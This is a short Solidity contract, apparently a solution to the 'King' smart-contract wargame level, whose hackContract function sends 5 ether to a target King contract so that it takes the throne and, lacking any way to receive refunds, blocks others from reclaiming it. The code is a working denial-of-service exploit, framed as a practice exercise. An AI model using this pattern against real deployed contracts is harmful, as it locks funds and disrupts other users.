// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address payable public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = payable(_contractAddress); 
    }

    function hackContract() external {
        // Code me! 
        (bool success, ) = contractAddress.call{value: 5 ether, gas: 30000000}(""); 
    }
}
